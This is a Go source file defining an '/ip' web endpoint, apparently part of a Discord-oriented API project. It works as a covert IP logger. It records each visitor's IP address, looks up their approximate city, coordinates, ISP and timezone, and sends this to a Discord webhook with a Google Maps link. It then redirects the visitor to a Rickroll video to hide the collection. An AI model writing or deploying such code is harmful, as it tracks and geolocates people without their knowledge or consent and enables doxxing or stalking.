package endpoints

import (
	"baxt-api/internal/discord"
	"baxt-api/internal/endpoint"
	"baxt-api/internal/env"
	"baxt-api/internal/utils"
	"encoding/json"
	"fmt"
	"github.com/gofiber/fiber/v2"
	"net"
	"net/http"
	"strings"
)

var IpEndpoint = endpoint.Endpoint{
	Method: fiber.MethodGet,
	Url:    "/ip",
	Handler: func(ctx *fiber.Ctx) error {
		// Get ip
		ip, _, err := net.SplitHostPort(ctx.Context().RemoteAddr().String())
		// If the IP is 0.0.0.0, use Cloudflare IP for testing
		if ip == "127.0.0.1" {
			ip = "1.1.1.1"
		}
		if err != nil {
			ctx.Response().SetStatusCode(fiber.StatusInternalServerError)
			return ctx.JSON(fiber.Map{
				"success": false,
				"message": "Error while getting the IP",
			})
		}

		// Get ip info
		res, err := http.Get("https://ipwho.is/" + ip)
		if err != nil || res.StatusCode != 200 {
			ctx.Response().SetStatusCode(fiber.StatusBadGateway)
			return ctx.JSON(fiber.Map{
				"success": false,
				"message": "Error while making the request to the IP Whois API",
			})
		}

		defer utils.HandleBody(res.Body)

		// Response (json) -> struct
		var data Whois
		err = json.NewDecoder(res.Body).Decode(&data)
		if err != nil {
			ctx.Response().SetStatusCode(fiber.StatusInternalServerError)
			return ctx.JSON(fiber.Map{
				"success": false,
				"message": "Error while decoding the response from the IP Whois API",
			})
		}

		// Sometimes the API returns a 200 but the response is an error
		if !data.Success {
			ctx.Response().SetStatusCode(fiber.StatusBadGateway)
			return ctx.JSON(fiber.Map{
				"success": false,
				"message": "The IP Whois API returned an error",
				"error":   data.Message,
			})
		}

		mainField := fmt.Sprintf("**IP:** %s\n**Type:** %s", data.IP, data.Type)

		locationField := fmt.Sprintf(
			"**Continent:** %s\n**Country:** %s :flag_%s:\n**Region:** %s\n**City:** %s\n**Latitude:** %v\n**Longitude:** %v\n**Postal:** %s",
			data.Continent, data.Country, strings.ToLower(data.CountryCode), data.Region, data.City, data.Latitude, data.Longitude, data.Postal,
		)

		connectionField := fmt.Sprintf(
			"**ASN:** %v\n**Organization:** %s\n**ISP:** %s\n**Domain:** %s",
			data.Connection.ASN, data.Connection.Org, data.Connection.ISP, data.Connection.Domain,
		)

		timezoneFiled := fmt.Sprintf(
			"**ID:** %s\n**Offset:** %v\n**UTC:** %s",
			data.Timezone.ID, data.Timezone.Offset, data.Timezone.UTC,
		)

		embed := discord.Embed{
			Title:       "__IP Logger__",
			Description: "From: " + ctx.BaseURL(),
			Thumbnail: discord.Thumbnail{
				URL: env.AvatarURL,
			},
			Color: 13346551,
			Fields: []discord.Field{
				{
					Name:  ":zap: **Main**",
					Value: mainField,
				},
				{
					Name:  ":earth_americas: **Location**",
					Value: locationField,
				},
				{
					Name:  ":satellite: **Connection**",
					Value: connectionField,
				},
				{
					Name:  ":clock1: **Timezone**",
					Value: timezoneFiled,
				},
			},
		}

		button := discord.ComponentRow{
			Type: discord.ActionRowType,
			Components: []discord.Component{{
				Type:  discord.ButtonType,
				Style: discord.ButtonStyleLink,
				Label: "Open location in Google Maps",
				Url:   fmt.Sprintf("https://www.google.com/maps/search/%v,%v", data.Latitude, data.Longitude),
			}},
		}

		webhook := discord.Webhook{
			Username:   "IP Logger",
			AvatarURL:  env.AvatarURL,
			Embeds:     []discord.Embed{embed},
			Components: []discord.ComponentRow{button},
		}

		// Webhook (struct) -> json
		body, err := json.Marshal(webhook)
		if err != nil {
			ctx.Response().SetStatusCode(fiber.StatusInternalServerError)
			return ctx.JSON(fiber.Map{
				"success": false,
				"message": "Error while encoding the webhook",
			})
		}

		// Send the webhook
		res, err = http.Post(env.LoggerWebhook, fiber.MIMEApplicationJSON, strings.NewReader(string(body)))
		if err != nil || res.StatusCode != 204 {
			ctx.Response().SetStatusCode(fiber.StatusBadGateway)
			return ctx.JSON(fiber.Map{
				"success": false,
				"message": "Error while sending the webhook",
			})
		}

		defer utils.HandleBody(res.Body)

		// Yes, that is what you think it is
		return ctx.Redirect("https://youtu.be/dQw4w9WgXcQ", fiber.StatusSeeOther)
	},
}

type Whois struct {
	IP          string  `json:"ip"`
	Success     bool    `json:"success"`
	Message     string  `json:"message"`
	Type        string  `json:"type"`
	Continent   string  `json:"continent"`
	Country     string  `json:"country"`
	CountryCode string  `json:"country_code"`
	Region      string  `json:"region"`
	City        string  `json:"city"`
	Latitude    float32 `json:"latitude"`
	Longitude   float32 `json:"longitude"`
	Postal      string  `json:"postal"`
	Connection  struct {
		ASN    int    `json:"asn"`
		Org    string `json:"org"`
		ISP    string `json:"isp"`
		Domain string `json:"domain"`
	} `json:"connection"`
	Timezone struct {
		ID     string `json:"id"`
		Offset int    `json:"offset"`
		UTC    string `json:"utc"`
	} `json:"timezone"`
}
